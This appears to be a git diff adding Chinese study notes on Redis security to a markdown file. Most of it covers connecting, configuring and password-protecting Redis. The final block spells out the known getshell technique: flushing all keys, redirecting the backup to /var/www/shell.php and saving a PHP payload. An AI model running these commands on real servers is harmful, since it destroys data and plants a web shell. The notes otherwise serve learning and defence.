@@ -270,6 +270,58 @@ redis-cli -h host -p port -a password
 
 
 
+
+
+### redis安全学习小记
+
+[redis安全学习小记](https://mp.weixin.qq.com/s/W9joCtUQfNA62ZWXwqMmsw)
+
+**REDIS连接命令**
+
+redis-cli -h host -p port
+
+**获取配置**
+
+config get *
+
+**编辑配置**
+
+修改 redis.conf 文件或使用 config set 命令来修改配置
+
+**数据类型**
+
+五种：string list set zset hash
+
+**服务器配置**
+
+用 sed 修改配置（值得学习的装逼技术）：
+
+sed -i 's/daemonize no/daemonize yes/g' /etc/redis-5.0.8/redis.conf
+
+***redis*设置密码的两种方法**
+*redis*-*cli*连上去
+`config set requirepass 123456`
+或者修改*redis*.conf
+
+```
+sed -i 's/# requirepass foobared/requirepass 123456/g' /etc/redis/redis.conf
+```
+
+第二种方法设置完之后需要重启*redis*。
+
+然后再用*redis*-*cli*去连的时候需要先执行 AUTH 命令才可以执行其他命令。
+`AUTH 123456`
+*redis*-*cli* -a 的参数本质是就是 AUTH 命令
+
+**数据库备份**
+Redis SAVE 命令用于创建当前数据库的备份。常见利用其来写文件达到 getshell 的目的。
+
+redis-cli -h 127.0.0.1 flushall #清空所有key
+redis-cli -h 127.0.0.1 config set dir /var/www #设置数据库备份保存的目录
+redis-cli -h 127.0.0.1 config set dbfilename shell.php #设置数据库备份保存的文件名
+redis-cli -h 127.0.0.1 set webshell "<?php phpinfo();?>" #将想写入的内容写进key值
+redis-cli -h 127.0.0.1 save # 备份
+
 # 实践
 
 ## 安装
